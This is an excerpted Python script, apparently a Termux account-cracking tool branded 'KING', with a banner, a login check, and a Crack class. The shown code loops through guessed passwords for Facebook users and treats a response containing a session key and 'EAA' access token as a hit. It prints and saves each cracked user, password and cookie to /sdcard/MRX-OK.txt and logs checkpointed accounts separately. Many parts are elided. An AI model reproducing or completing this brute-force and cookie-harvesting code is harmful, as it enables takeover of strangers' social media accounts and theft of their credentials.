...
class Logo:
	...
	def logonya(self):
		...
		prints(f""" 
{H2}__________        __ __ _____   ________
{H2}   / ____/ __ )      / //_//  _/ | / / ____/
{H2} / /_  / __  |_____/ ,<   / //  |/ / / __
{H2} / __/ / /_/ /_____/ /| |_/ // /|  / /_/ /
{H2}/_/   /_____/     /_/ |_/___/_/ |_/\____/
{H2}
{H2}
----------------------------------------------
TOOL :  KING
...
class Menu:
	...
	def cek_login(self,cookie):
		try:
			...
			prints(Panel(f"""{M2} WELCOME TO KING CYBER""",width=80,style=f"{color_panel}"))
			exit()
...
class Crack:
	...
	def metode_api(self,user,pwx):
		prog.update(des,description=f"{H2}[MRX💥]{P2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{P2} CP : {P2}{len(self.cp)}{P2}")
		prog.advance(des)
		try:
			for pw in pwx:
				pw = pw.lower()
				...
				if "session_key" in post.text and "EAA" in post.text:
					...
					prints(f" [MR-X-444🤡OK] {H2}{user}|{pw}{P2}  [JUST NOW] \n[💥]={M2}=COOKIE {H2} •  {H2}{coki}\n")
					
					open('/sdcard/MRX-OK.txt','a').write(f"{user}|{pw}|{coki}\n")
					break
				elif "User must verify their account" in post.text:
					self.cp.append(user)
					tree = Tree("                        ")
					tree.add(f" KING💔 {K2}{user}|{pw}{P2} ")
					#prints(tree)
					open(f"CP/{self.hari_ini}.txt","a").write(f"KING CP🥲 | {user} | {pw}\n")
					break
	...
	def simpan_hasil(self):
		prints(f"""{K2}KING CRACK OK DATE : MRX-OK.txt
{K2}KING CRACK CP DATE : MRX-CP.txt\n""")
###----------[ MENU ]---------- ###
class Back:
